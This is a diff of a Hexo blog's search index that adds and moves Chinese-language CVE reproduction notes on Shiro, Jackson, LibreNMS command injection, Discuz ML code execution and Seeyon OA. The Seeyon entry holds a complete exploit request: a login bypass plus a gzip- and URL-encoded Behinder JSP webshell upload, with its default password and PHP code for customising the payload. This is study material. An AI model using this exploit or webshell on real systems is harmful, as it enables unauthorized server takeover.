+<p>进行%3b的操作，绕过登录访问到了页面内容</p>
+<p><img src="/2020/10/23/0x07cve-2020-13933%E5%A4%8D%E7%8E%B0/image-20200922183207361.png" alt="image-20200922183207361"></p>
 ]]></content>
       <categories>
         <category>漏洞复现</category>
       </categories>
+      <tags>
+        <tag>apaches shiro</tag>
+      </tags>
   </entry>
   <entry>
     <title>0x0ACVE-2020-8617复现</title>
@@ -1060,6 +1052,66 @@
       </categories>
       <tags>
         <tag>pipenv</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>0x09CVE-2020-11113复现</title>
+    <url>/2020/10/30/0x09CVE-2020-11113%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h4 id="CVE-2020-11113复现"><a href="#CVE-2020-11113复现" class="headerlink" title="CVE-2020-11113复现"></a>CVE-2020-11113复现</h4><p>复现参考：<a href="https://blog.csdn.net/mukami0621/article/details/108447493">https://blog.csdn.net/mukami0621/article/details/108447493</a></p>
+<p>这两个漏洞复现方式很像…</p>
+<a id="more"></a>
+
+<p>POC:<a href="https://github.com/Al1ex/CVE-2020-11113">https://github.com/Al1ex/CVE-2020-11113</a></p>
+<p>项目里已经搭好了环境，其实应该按之前复现过的24616流程，稍微改改POC内容即可</p>
+<p>复现成功结果：</p>
+<p><img src="/2020/10/30/0x09CVE-2020-11113%E5%A4%8D%E7%8E%B0/image-20201102140016594.png" alt="image-20201102140016594"></p>
+<p>出现的问题：</p>
+<p>1、有一个包无法下载</p>
+<p>解决：<a href="https://mvnrepository.com,自行下载导入(虽然官网的验证蛮烦的/">https://mvnrepository.com，自行下载导入（虽然官网的验证蛮烦的</a></p>
+<p>2、和24616不一样，恶意类发送了但是不知道为啥计算器弹不出来…</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>0x0Ccve-2019-10669</title>
+    <url>/2020/11/11/0x0Ccve-2019-10669/</url>
+    <content><![CDATA[<h4 id="CVE-2019-10669LibreNMS-命令注入漏洞"><a href="#CVE-2019-10669LibreNMS-命令注入漏洞" class="headerlink" title="CVE-2019-10669LibreNMS 命令注入漏洞"></a>CVE-2019-10669LibreNMS 命令注入漏洞</h4><p>参考：<a href="https://github.com/cyberghost2h1/metasploit-framework/blob/c833487457be6c16be214048e3fb0e7ef2a23cdf/documentation/modules/exploit/linux/http/librenms_collectd_cmd_inject.md">https://github.com/cyberghost2h1/metasploit-framework/blob/c833487457be6c16be214048e3fb0e7ef2a23cdf/documentation/modules/exploit/linux/http/librenms_collectd_cmd_inject.md</a></p>
+<a id="more"></a>
+
+<h5 id="0x1-漏洞复现"><a href="#0x1-漏洞复现" class="headerlink" title="0x1 漏洞复现"></a>0x1 漏洞复现</h5><p>这个漏洞的环境也是蛮麻烦的</p>
+<p>看到poc发现是集成的msf模块，然后到我的msf里一查，发现已经有了</p>
+<p>攻击环境就准备好了</p>
+<p>靶机环境：</p>
+<p>本来想下软件装，装了好几次不成功</p>
+<p>参考：<a href="https://cloud.tencent.com/developer/article/1518046">https://cloud.tencent.com/developer/article/1518046</a></p>
+<p>先下一个librenms的ubuntu版直接虚拟机跑</p>
+<p>然后根据参考改一下网卡的配置，在主机上访问对应的ip地址和端口就能访问web界面了</p>
+<p>此时在kali里跑msf，始终打不成功，看报错是没找到对应的collectd插件</p>
+<p>需要在ubuntu换源更新下载安装一条龙</p>
+<p>装好了之后根据官方配置（太简略，并不能成功（<a href="https://docs.librenms.org/Support/Configuration/#collectd">https://docs.librenms.org/Support/Configuration/#collectd</a></p>
+<p>最后找到github上一个配置才成功，此时页面上出现了collectd插件</p>
+<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112100410102.png" alt="image-20201112100410102"></p>
+<p>也能打成功了</p>
+<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112100430763.png" alt="image-20201112100430763"></p>
+<h5 id="0x2-漏洞原理"><a href="#0x2-漏洞原理" class="headerlink" title="0x2 漏洞原理"></a>0x2 漏洞原理</h5><p>漏洞点：html/includes/graphs/device/collectd.inc.php</p>
+<p>其中用户提供的参数from和to是用mysqli_escape_real_string函数（mres）过滤的，但是这个函数不能转义多个命令行语法字符，我们就可以注入命令到变量$rrd_cmd中，通过passthru()执行</p>
+<p><img src="/2020/11/11/0x0Ccve-2019-10669/DED6A2E31D73FFB660CEFBF548FD1BD6.png" alt="DED6A2E31D73FFB660CEFBF548FD1BD6"></p>
+<p>passthru — 执行外部程序并且显示原始输出</p>
+<p>passthru ( string $command [, int &amp;$return_var ] ) : void </p>
+<p><img src="/2020/11/11/0x0Ccve-2019-10669/B99C52DBA71F8893ED2EBA7059B778F5.jpg" alt="B99C52DBA71F8893ED2EBA7059B778F5"></p>
+<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112205158282.png" alt="image-20201112205158282"></p>
+<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112205315869.png" alt="image-20201112205315869"></p>
+<p><img src="/2020/11/11/0x0Ccve-2019-10669/3FF732E6A3DA2AF9AFBACCD7AD86A5CA-5185412.jpg" alt="3FF732E6A3DA2AF9AFBACCD7AD86A5CA-5185412"></p>
+<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112205357269.png" alt="image-20201112205357269"></p>
+<p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数，escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。 </p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>librenms</tag>
       </tags>
   </entry>
   <entry>
@@ -1107,83 +1159,6 @@
       </tags>
   </entry>
   <entry>
-    <title>0x0Ccve-2019-10669</title>
-    <url>/2020/11/11/0x0Ccve-2019-10669/</url>
-    <content><![CDATA[<h4 id="CVE-2019-10669LibreNMS-命令注入漏洞"><a href="#CVE-2019-10669LibreNMS-命令注入漏洞" class="headerlink" title="CVE-2019-10669LibreNMS 命令注入漏洞"></a>CVE-2019-10669LibreNMS 命令注入漏洞</h4><p>参考：<a href="https://github.com/cyberghost2h1/metasploit-framework/blob/c833487457be6c16be214048e3fb0e7ef2a23cdf/documentation/modules/exploit/linux/http/librenms_collectd_cmd_inject.md">https://github.com/cyberghost2h1/metasploit-framework/blob/c833487457be6c16be214048e3fb0e7ef2a23cdf/documentation/modules/exploit/linux/http/librenms_collectd_cmd_inject.md</a></p>
-<a id="more"></a>
-
-<h5 id="0x1-漏洞复现"><a href="#0x1-漏洞复现" class="headerlink" title="0x1 漏洞复现"></a>0x1 漏洞复现</h5><p>这个漏洞的环境也是蛮麻烦的</p>
-<p>看到poc发现是集成的msf模块，然后到我的msf里一查，发现已经有了</p>
-<p>攻击环境就准备好了</p>
-<p>靶机环境：</p>
-<p>本来想下软件装，装了好几次不成功</p>
-<p>参考：<a href="https://cloud.tencent.com/developer/article/1518046">https://cloud.tencent.com/developer/article/1518046</a></p>
-<p>先下一个librenms的ubuntu版直接虚拟机跑</p>
-<p>然后根据参考改一下网卡的配置，在主机上访问对应的ip地址和端口就能访问web界面了</p>
-<p>此时在kali里跑msf，始终打不成功，看报错是没找到对应的collectd插件</p>
-<p>需要在ubuntu换源更新下载安装一条龙</p>
-<p>装好了之后根据官方配置（太简略，并不能成功（<a href="https://docs.librenms.org/Support/Configuration/#collectd">https://docs.librenms.org/Support/Configuration/#collectd</a></p>
-<p>最后找到github上一个配置才成功，此时页面上出现了collectd插件</p>
-<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112100410102.png" alt="image-20201112100410102"></p>
-<p>也能打成功了</p>
-<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112100430763.png" alt="image-20201112100430763"></p>
-<h5 id="0x2-漏洞原理"><a href="#0x2-漏洞原理" class="headerlink" title="0x2 漏洞原理"></a>0x2 漏洞原理</h5><p>漏洞点：html/includes/graphs/device/collectd.inc.php</p>
-<p>其中用户提供的参数from和to是用mysqli_escape_real_string函数（mres）过滤的，但是这个函数不能转义多个命令行语法字符，我们就可以注入命令到变量$rrd_cmd中，通过passthru()执行</p>
-<p><img src="/2020/11/11/0x0Ccve-2019-10669/DED6A2E31D73FFB660CEFBF548FD1BD6.png" alt="DED6A2E31D73FFB660CEFBF548FD1BD6"></p>
-<p>passthru — 执行外部程序并且显示原始输出</p>
-<p>passthru ( string $command [, int &amp;$return_var ] ) : void </p>
-<p><img src="/2020/11/11/0x0Ccve-2019-10669/B99C52DBA71F8893ED2EBA7059B778F5.jpg" alt="B99C52DBA71F8893ED2EBA7059B778F5"></p>
-<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112205158282.png" alt="image-20201112205158282"></p>
-<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112205315869.png" alt="image-20201112205315869"></p>
-<p><img src="/2020/11/11/0x0Ccve-2019-10669/3FF732E6A3DA2AF9AFBACCD7AD86A5CA-5185412.jpg" alt="3FF732E6A3DA2AF9AFBACCD7AD86A5CA-5185412"></p>
-<p><img src="/2020/11/11/0x0Ccve-2019-10669/image-20201112205357269.png" alt="image-20201112205357269"></p>
-<p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数，escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。 </p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>librenms</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>0x0Dcve-2019-13956</title>
-    <url>/2020/11/12/0x0Dcve-2019-13956/</url>
-    <content><![CDATA[<h4 id="CVE-2019-13956Discuz-ML远程代码执行"><a href="#CVE-2019-13956Discuz-ML远程代码执行" class="headerlink" title="CVE-2019-13956Discuz! ML远程代码执行"></a>CVE-2019-13956Discuz! ML远程代码执行</h4><p>参考：<a href="https://www.cnblogs.com/yuzly/p/11386755.html">https://www.cnblogs.com/yuzly/p/11386755.html</a></p>
-<a id="more"></a>
-
-<h5 id="0x1-复现过程"><a href="#0x1-复现过程" class="headerlink" title="0x1 复现过程"></a>0x1 复现过程</h5><p>这个漏洞复现起来还是很容易的，软件也是免费开源的，搭起来就没什么问题</p>
-<p>先去下载了v3.3的版本：<a href="https://sourceforge.net/p/discuz-ml/code/ci/v.3.3/tarball?path=">https://sourceforge.net/p/discuz-ml/code/ci/v.3.3/tarball?path=</a></p>
-<p>然后开PHPstudy往里一放即可到网页上Install</p>
-<p>点击链接抓包改包</p>
-<p><img src="/Users/kami/Desktop/hexo/source/_posts/0x0Dcve-2019-13956/image-20201112150139079.png" alt="image-20201112150139079"></p>
-<p>可以看到缓存里的内容被更改了</p>
-<p><img src="/Users/kami/Desktop/hexo/source/_posts/0x0Dcve-2019-13956/image-20201112150217140.png" alt="image-20201112150217140"></p>
-<p>上传shell</p>
-<p><img src="/Users/kami/Desktop/hexo/source/_posts/0x0Dcve-2019-13956/image-20201112150159180.png" alt="image-20201112150159180"></p>
-<h5 id="0x2-漏洞原理"><a href="#0x2-漏洞原理" class="headerlink" title="0x2 漏洞原理"></a>0x2 漏洞原理</h5><p>在/upload/source/module/portal/portal_index.php文件中</p>
-<p><img src="/2020/11/12/0x0Dcve-2019-13956/image-20201112155957305.png" alt="image-20201112155957305"></p>
-<p>使用template函数处理’diy:portal/index’,然后使用include_once包含</p>
-<p>include_once：</p>
-<p>可以用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题。 </p>
-<p>跟进template函数：</p>
-<p><img src="/2020/11/12/0x0Dcve-2019-13956/image-20201112160428730.png" alt="image-20201112160428730"></p>
-<p>可以看到返回的是一个拼接值,以及相关的两个变量DISCUZ_LANG和DISCUZ_ROOT</p>
-<p>找到它们的定义，DISCUZ_ROOT是个固定的</p>
-<p><img src="/2020/11/12/0x0Dcve-2019-13956/image-20201112162712111.png" alt="image-20201112162712111"></p>
-<p>DISCUZ_LANG和$lng有关</p>
-<p><img src="/2020/11/12/0x0Dcve-2019-13956/image-20201112162520552.png" alt="image-20201112162520552"></p>
-<p>我们可以看到$lng和cookie中的languages有关，那我们就可以控制这个变量然后改包了</p>
-<p><img src="/2020/11/12/0x0Dcve-2019-13956/image-20201112162914790.png" alt="image-20201112162914790"></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>discuz</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CTF-2020.6.12</title>
     <url>/2020/06/12/CTF-2020.6.12/</url>
     <content><![CDATA[<h4 id="git文件泄露导致源码泄露"><a href="#git文件泄露导致源码泄露" class="headerlink" title=".git文件泄露导致源码泄露"></a>.git文件泄露导致源码泄露</h4><p>首先，关于git：分布式版本控制系统（版本控制：记录每次文件的改动，并支持协作编辑）</p>
@@ -1223,6 +1198,43 @@
       </categories>
       <tags>
         <tag>git</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>0x0Dcve-2019-13956</title>
+    <url>/2020/11/12/0x0Dcve-2019-13956/</url>
+    <content><![CDATA[<h4 id="CVE-2019-13956Discuz-ML远程代码执行"><a href="#CVE-2019-13956Discuz-ML远程代码执行" class="headerlink" title="CVE-2019-13956Discuz! ML远程代码执行"></a>CVE-2019-13956Discuz! ML远程代码执行</h4><p>参考：<a href="https://www.cnblogs.com/yuzly/p/11386755.html">https://www.cnblogs.com/yuzly/p/11386755.html</a></p>
+<a id="more"></a>
+
+<h5 id="0x1-复现过程"><a href="#0x1-复现过程" class="headerlink" title="0x1 复现过程"></a>0x1 复现过程</h5><p>这个漏洞复现起来还是很容易的，软件也是免费开源的，搭起来就没什么问题</p>
+<p>先去下载了v3.3的版本：<a href="https://sourceforge.net/p/discuz-ml/code/ci/v.3.3/tarball?path=">https://sourceforge.net/p/discuz-ml/code/ci/v.3.3/tarball?path=</a></p>
+<p>然后开PHPstudy往里一放即可到网页上Install</p>
+<p>点击链接抓包改包</p>
+<p><img src="/Users/kami/Desktop/hexo/source/_posts/0x0Dcve-2019-13956/image-20201112150139079.png" alt="image-20201112150139079"></p>
+<p>可以看到缓存里的内容被更改了</p>
+<p><img src="/Users/kami/Desktop/hexo/source/_posts/0x0Dcve-2019-13956/image-20201112150217140.png" alt="image-20201112150217140"></p>
+<p>上传shell</p>
+<p><img src="/Users/kami/Desktop/hexo/source/_posts/0x0Dcve-2019-13956/image-20201112150159180.png" alt="image-20201112150159180"></p>
+<h5 id="0x2-漏洞原理"><a href="#0x2-漏洞原理" class="headerlink" title="0x2 漏洞原理"></a>0x2 漏洞原理</h5><p>在/upload/source/module/portal/portal_index.php文件中</p>
+<p><img src="/2020/11/12/0x0Dcve-2019-13956/image-20201112155957305.png" alt="image-20201112155957305"></p>
+<p>使用template函数处理’diy:portal/index’,然后使用include_once包含</p>
+<p>include_once：</p>
+<p>可以用于在脚本执行期间同一个文件有可能被包含超过一次的情况下，想确保它只被包含一次以避免函数重定义，变量重新赋值等问题。 </p>
+<p>跟进template函数：</p>
+<p><img src="/2020/11/12/0x0Dcve-2019-13956/image-20201112160428730.png" alt="image-20201112160428730"></p>
+<p>可以看到返回的是一个拼接值,以及相关的两个变量DISCUZ_LANG和DISCUZ_ROOT</p>
+<p>找到它们的定义，DISCUZ_ROOT是个固定的</p>
+<p><img src="/2020/11/12/0x0Dcve-2019-13956/image-20201112162712111.png" alt="image-20201112162712111"></p>
+<p>DISCUZ_LANG和$lng有关</p>
+<p><img src="/2020/11/12/0x0Dcve-2019-13956/image-20201112162520552.png" alt="image-20201112162520552"></p>
+<p>我们可以看到$lng和cookie中的languages有关，那我们就可以控制这个变量然后改包了</p>
+<p><img src="/2020/11/12/0x0Dcve-2019-13956/image-20201112162914790.png" alt="image-20201112162914790"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>discuz</tag>
       </tags>
   </entry>
   <entry>
@@ -1291,6 +1303,40 @@
       </categories>
       <tags>
         <tag>apaches struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>seeyonOA-ajax未授权访问及任意文件上传漏洞</title>
+    <url>/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>参考：</p>
+<p>1、<a href="http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20ajax.do%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html">http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20ajax.do%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html</a></p>
+<p>2、宽字节：<a href="https://mp.weixin.qq.com/s/bHKDSF7HWsAgQi9rTagBQA">https://mp.weixin.qq.com/s/bHKDSF7HWsAgQi9rTagBQA</a></p>
+<a id="more"></a>
+
+<h5 id="0x1-原理："><a href="#0x1-原理：" class="headerlink" title="0x1 原理："></a>0x1 原理：</h5><p>OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。</p>
+<p>CTPHandlerInterceptor先判断是否为ajax请求，生成ignoreUrl。User.isIgnoreUrl可以根据ignoreUrl判断是否需要重定向到用户登录页面。所以我们只要使用特定的ignoreUrl就可以绕过登录，访问被保护的接口，比如文件上传接口。</p>
+<h5 id="0x2-复现："><a href="#0x2-复现：" class="headerlink" title="0x2 复现："></a>0x2 复现：</h5><p>poc:</p>
+<p><code>POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip HTTP/1.1 Host: oatest.dptech.com:81 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 3485</code></p>
+<p><code>managerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%0AuTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28%2A%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%C2%9D%C2%9D%C2%87%C3%B6%C2%A8%1F%C2%A6I%C3%99y%C3%B8%09%C3%8B%C3%9C%5DH%03%0F%C3%A3%C3%9A%C2%87%C2%9D%C2%98%C3%9C%C3%80%2C%C2%A9%5Cn%C3%8CJ%C3%8B+sE%C3%A1%C2%B6%25%C2%B5%C2%8CE%C3%8ERe%C3%81%2C.%C3%96%5C%12%402%C3%8F%01%C2%AF%C3%A7k%C2%A2%14%C2%AE6%C2%96%C2%8F%C2%83%C2%97%C3%A2%28.%22%5B%C2%93%7CH%C3%B4%0Ap%C2%B8pC%16m%C2%B4a%25%C2%85%C3%83g%27R%C2%AE%5B%C2%A2%26%C2%80%C3%A8%21%141gk%C3%82%C3%952+%C2%96D%C2%9C%01q%5C%C3%81%1A%C2%9F%2C8K%13%06%C3%B4%3D%5D%C2%A38mx%C3%93%C3%8F-%7E%25%C2%80%C2%A5Z%7C%2A%C2%A3%C2%B8%C2%B6%C2%B1%C3%89e%24%15%C2%BB%C2%B0%C3%BC%07%C3%B0%2F%C3%9FlQ%0F%5DqQY%C2%A6%C2%9A%C2%B8%C3%9C%C3%B0Q%12%C2%95%C3%942%C2%95%C2%9B%C2%B48%C3%BA%C2%B6%19%C2%B0%C2%B6%21%C2%9CA5%C2%99Q%C2%9D%1B%60%C3%8B%C3%822T%0C%C2%A2L%C2%97%C3%A7%C2%AD%C3%9EA%1C%07%14%C2%A3%C2%92%C3%84M%C3%A2%C3%B1%C3%8A%00PZ%C2%A6%C3%B4%C2%96%1F%5C%C2%A1%C2%B1J%1Dc%C3%A3%C3%AF%C2%B92%00%C3%BC%C3%86%C2%B7%C2%AB%00y%C2%A6%C2%8A%C2%A5E%06-%C2%84G4%3E%16%C2%9A%C2%AB%5CZ%C2%B6vk%C2%A2b%C2%9B%C3%A0%C3%9C%3E%C2%B6%C3%98%C2%B2%28%C2%A5%C2%9Bi%C2%89%C3%96%C2%A4%C3%84.%C2%81%C2%AC3%3D%C2%8FN%26%C3%BBLsZ%C3%A7%C3%BDl%1B%C2%B5%C3%9E%2A%C2%A09%C2%A0%C3%B9%C2%BB%C3%A7-RB%40%C3%B0%15%C2%8A%25%C2%863%C3%A1%00%C2%97%C2%AB%C3%84%25%C3%80wn%2C%C2%B2%0F%C3%BB%C2%81%7D%C3%98T%5B%C3%83%C3%86V%C2%A8%C2%9F%C2%B7%07i%60%21i%048%C3%BD%C3%96%C3%94%00%09Wh%C2%AA%C2%86e%C2%94%03%5B%C3%B3%11%C3%94%C2%A4%C3%94%C2%A9%C3%8E%C2%A3%3D%C2%87%C2%AFN%1B%C3%A3%C3%B8%C2%8D%5E%13%C2%88%C3%A1%1C%C3%93%C2%BA%C2%AA%C2%81K%14%2COW%13U%C3%9F+%C3%B9%C2%90%C2%85k%1A%C2%83c%C3%AE%C3%A3%0D%2As%C3%9B%04%C3%BE%C2%91%C3%93%C3%83%3AV%C2%8D%C3%93%C2%85%23%3F%C3%81V%C3%A5%C3%87%1F%C3%BE%C2%8C%C3%AC_%C3%BFL%C3%A4JB%C2%B2%C3%96%C3%88%C2%A7u%C2%BE%40%C3%A5%27%C3%AB7%7C%C3%AD%3Cr%C2%89%C3%8E%C3%93%C3%BA%C3%84P%0C%12P5zm%7Dj%C2%BD%C3%86%C2%AF_k%23O%C3%8FT%0Eb%C2%AB%12%C3%8E.k%C3%93%7C%2CRY%140%C2%AC%267h%0Cs%C3%97%C3%807%C3%BA6%C3%9D%C3%AB%C3%8AB%09%C3%959%C3%8Dkq%C2%B7%C3%8B%C2%9B%C3%BE%C3%A0T%C2%BC%C2%8Ftb%C3%93%5E%C2%95%C2%97%2B%0CL%1D%03%7E%C2%9F%C3%9B%C2%9C%C3%8E%1E%C2%89%C3%BE%C3%B6G%0Ej%C2%9AN%C2%ADK%C2%8E1%C3%B53%C2%A11%C3%90%C3%B8%C3%A1%C3%8A%C2%8D%14%C3%962%C2%84%C2%90%C3%86G%C3%BD%C3%90Kh%2CRP%05MO%C3%AF%C2%B9q%0EE%7D%08imw%C3%93q%C3%93%C2%93%C2%80S%2A%C3%87%C2%9C%C2%B0%C2%AE%C2%A8%C2%B3%C2%BB%C3%B0Z%C2%B4u%5D%15.%C2%BF%7F%7C%C2%9Fr%26%C3%8D%C2%A3%3EA%29%C3%A8O%5E%C2%B4%C3%B9%C2%B7%C3%A1%C3%8C%031%C2%A4%C2%83%0E%C3%AFw%3B%C3%A3%C2%9F%2B%C3%B5%C3%BE%3B%C3%95%C2%AD%C3%99%C2%9Dim%5B%C2%A6w%07%C3%AC%C2%B7%C3%B7%24%3F%C2%9D%28%40%C2%B3%04%1E%C2%BEt%C2%8E%C2%87%C3%85%C3%97%C3%A7%C2%8FK%C3%A2%C3%A3%C2%9E%C3%A97%0C%C2%8Ez%1F%C3%81%C3%BFO%17%C3%A08%C3%B5%C2%A8c%3F%C2%BE%C3%97%7B%C2%90%12%C3%90%3B1i%C3%A6d%080eY%C3%B6%1E%5E%C2%BB%3F%C3%A8r%C2%A4%0B%C3%B2%C2%B5%C2%BE%C2%B3K%C3%AEu%C3%BF%C3%BE%17%1CR%C2%AD%17W%05%00%00</code></p>
+<p>成功的话会返回：</p>
+<p><img src="/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20210113093745161.png" alt="image-20210113093745161"></p>
+<p>冰蝎连接：默认密码：rebeyond</p>
+<p><img src="/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20210113092857670.png" alt="image-20210113092857670"></p>
+<h5 id="特殊："><a href="#特殊：" class="headerlink" title="特殊："></a>特殊：</h5><p>漏洞的原理很简单，感觉学到的是关于冰蝎这个poc的生成：</p>
+<p>将冰蝎3默认的jsp的shell先做了base64的加密，然后做gzip数据的压缩</p>
+<p>gzdecode — Decodes a gzip compressed string，解压一个使用 gzip 压缩的字符串</p>
+<p><img src="/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20210113100709420.png" alt="image-20210113100709420"></p>
+<p>最后进行了 url编码</p>
+<p>可以自定义：</p>
+<p><code>$webshell = str_replace(&quot;../webapps/seeyon/&quot;,&quot;../webapps/seeyon/&quot;,$webshell); $webshell = str_replace(&quot;PeiQi.jspx&quot;,&quot;PeiQi.jspx&quot;,$webshell); $webshell = str_replace(&quot;e45e329feb5d925b&quot;,&quot;e45e329feb5d925b&quot;,$webshell);</code></p>
+<p><code>$webshell = gzencode($webshell); $webshell = iconv(&quot;ISO-8859-1&quot;,&quot;UTF-8&quot; ,$webshell); $webshell = urlencode(&quot;$webshell&quot;);</code></p>
+<p>（然后关注了一下清水川崎师傅</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>seeyon OA</tag>
       </tags>
   </entry>
   <entry>
@@ -1457,40 +1503,6 @@
       </categories>
       <tags>
         <tag>恶意代码</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>seeyonOA-ajax未授权访问及任意文件上传漏洞</title>
-    <url>/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>参考：</p>
-<p>1、<a href="http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20ajax.do%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html">http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20ajax.do%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html</a></p>
-<p>2、宽字节：<a href="https://mp.weixin.qq.com/s/bHKDSF7HWsAgQi9rTagBQA">https://mp.weixin.qq.com/s/bHKDSF7HWsAgQi9rTagBQA</a></p>
-<a id="more"></a>
-
-<h5 id="0x1-原理："><a href="#0x1-原理：" class="headerlink" title="0x1 原理："></a>0x1 原理：</h5><p>OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。</p>
-<p>CTPHandlerInterceptor先判断是否为ajax请求，生成ignoreUrl。User.isIgnoreUrl可以根据ignoreUrl判断是否需要重定向到用户登录页面。所以我们只要使用特定的ignoreUrl就可以绕过登录，访问被保护的接口，比如文件上传接口。</p>
-<h5 id="0x2-复现："><a href="#0x2-复现：" class="headerlink" title="0x2 复现："></a>0x2 复现：</h5><p>poc:</p>
